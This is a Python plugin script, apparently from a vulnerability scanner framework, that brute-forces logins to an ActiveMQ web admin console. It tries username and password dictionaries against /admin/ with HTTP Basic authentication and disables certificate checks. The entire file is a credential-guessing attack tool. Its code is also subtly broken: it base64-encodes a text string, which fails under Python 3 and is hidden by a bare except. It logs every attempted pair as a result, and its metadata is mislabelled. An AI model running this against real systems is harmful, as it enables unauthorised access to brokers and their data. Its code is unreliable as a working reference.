#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'


def get_script_info(data=None):
    script_info = {
        "name": "Acticemq Burst",
        "info": "This is a test.",
        "level": "low",
        "type": "info",
        "author": "orleven",
        "url": "",
        "keyword": "tag:iis",
        "source": 1
    }
    return script_info



def prove(data):
    '''
    data = {
        "target_host":"",
        "target_port":"",
        "proxy":"",
        "dic_one":"",
        "dic_two":"",
        "cookie":"",
        "url":"",
        "flag":"",
        "data":"",
        "":"",

    }

    '''
    usernamedic = _read_dic(data['dic_one']) if 'dic_one' in data.keys() else  _read_dic('dict/activemq_usernames.txt')
    passworddic = _read_dic(data['dic_two']) if 'dic_two' in data.keys() else  _read_dic('dict/activemq_passwords.txt')

    import socket
    socket.setdefaulttimeout(5)
    headers = {}
    headers[
        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    import requests
    import urllib.parse
    from base64 import b64encode, b64decode
    requests.packages.urllib3.disable_warnings()
    protocol, s1 = urllib.parse.splittype(data['url'])
    host, s2 = urllib.parse.splithost(s1)
    host, port = urllib.parse.splitport(host)
    port = port if port != None else 443 if protocol == 'https' else 80
    base_url = protocol + "://" + host + ":" + str(port)
    url = base_url + "/admin/"

    for linef1 in usernamedic:
        username = linef1.strip('\r').strip('\n')
        for linef2 in passworddic:
            try:
                password = (
                    linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                    '\r').strip('\n')
                key = b64encode(":".join([username,password]))
                headers["Authorization"] = 'Basic %s' % key
                res = requests.get(url, headers=headers, verify=False, timeout=5)
                if 'Console' in res.text:
                    data['flag'] = True
                data['data'].append({"username": username,"password":password})
                data['res'].append({"info": username + "/" + password, "key": "Authorization: " + key})
            except Exception:
                pass

    return data




def _read_dic(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()